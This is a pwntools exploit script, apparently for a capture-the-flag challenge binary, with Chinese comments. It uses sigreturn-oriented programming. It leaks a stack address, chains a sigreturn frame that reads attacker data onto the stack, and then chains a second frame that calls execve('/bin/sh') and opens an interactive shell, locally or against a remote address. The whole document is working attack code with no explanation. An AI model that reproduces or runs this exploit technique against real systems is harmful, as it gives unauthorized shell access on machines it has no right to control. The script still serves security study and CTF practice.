from kk import*
#context(arch='i386', os='linux')
#context(arch='amd64', os='linux')
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'
# 根据是否远程自动选择 libc

if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#记得改
rop = ROP(elf)

def go():
    if args.KK:
        return remote('192.168.127.12', 10001)
    else:
        return process('./pwn')
#python3 exp.py本地 #python3 exp.py KK=1远程

def pwn():
    p = go()

    if args.GDB:
    # 这里可以写默认的断点，比如 b main
        GDB(p, 'vmmap')
    
    syscall_ret = 0x4000BE
    addr = 0x4000B0


    GDB(p)
    payload = p64(addr)*3
    p.send(payload)
    
    pause()
    p.send('\xb3')
    #stack_addr = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
    stack_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
    print(hex(stack_addr))
    stack1_addr = stack_addr & 0xfffffffffffff000
    print(hex(stack1_addr))
    stack2_addr = stack1_addr - 0x2000
    print(hex(stack2_addr))

    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_read
    sigframe.rdi = 0
    sigframe.rsi = stack2_addr
    sigframe.rdx = 0x400
    sigframe.rsp = stack2_addr + 8
    sigframe.rip = syscall_ret
    payload = p64(addr) + b'a' * 8 + bytes(sigframe)
    p.send(payload)

    ## set rax=15 and call sigreturn
    sigreturn = p64(syscall_ret) + b'b' * 7
    pause()
    p.send(sigreturn)

    bin_sh = stack2_addr        

    sigframe1 = SigreturnFrame()
    sigframe1.rax = 59
    sigframe1.rdi = bin_sh
    sigframe1.rsi = 0
    sigframe1.rdx = 0
    sigframe1.rsp = stack2_addr + 0x1000
    sigframe1.rip = syscall_ret
    payload = b"/bin/sh\x00".ljust(8, b"\x00") + p64(addr) + b'b'*8 + bytes(sigframe1)
    p.send(payload)

    payload = p64(syscall_ret) + b'a'*7
    pause()
    p.send(payload)
 
    p.interactive()

if __name__ == "__main__":
    pwn()
